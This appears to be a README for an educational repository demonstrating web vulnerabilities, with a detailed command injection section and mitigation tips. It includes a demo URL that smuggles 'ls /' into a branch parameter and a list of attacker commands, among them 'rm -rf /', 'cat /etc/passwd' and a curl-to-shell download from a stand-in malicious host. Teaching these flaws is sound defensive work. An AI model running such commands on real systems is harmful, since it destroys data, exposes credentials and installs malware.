# Web Security Standards Demo

## Introduction
This repository serves as an educational resource for understanding and addressing common web security vulnerabilities. It currently covers the following vulnerabilities through practical demonstrations, with actionable steps to mitigate them:
- Cross-Site Request Forgery (CSRF)
- SQL Injection
- Command Injection
- Cross-Site Scripting (XSS)

By studying these examples, developers can cultivate a security-first mindset, essential for building robust, production-grade web applications. This repo will be continuously updated with additional web security vulnerabilities and practices to further enhance secure development techniques.

### Command Injection

Command injection is a security vulnerability that occurs when an application passes unsafe user-supplied data to a system shell or command interpreter. Attackers can exploit this flaw to execute arbitrary commands on the host operating system, potentially compromising the entire system.

#### Running the Demo

To start the server, run:

```bash
go run cmd/commandinjection/main.go
```

#### Example Attack

Access the following URL to simulate a command injection attack:

```
http://localhost:8080/gitlog?branch=main%3Bls%20%2F
```

This URL injects an additional `ls /` command after the intended `main` branch, demonstrating how unsanitized input can lead to arbitrary command execution.

#### Potential Malicious Commands

Attackers may attempt to run various harmful commands, such as:

- ``rm -rf /`` — Deletes all files on the server.
- ``cat /etc/passwd`` — Reads sensitive system files.
- ``whoami`` — Reveals the user context the server is running under.
- ``curl http://malicious-site.com/malware.sh | sh`` — Downloads and executes malicious scripts.
- ``ps aux`` — Lists running processes, potentially exposing sensitive information.

#### Mitigation Strategies

- **Never** pass user input directly to system commands.
- Use safe APIs or parameterized functions.
- Validate and sanitize all user inputs.
- Apply the principle of least privilege to the application process.

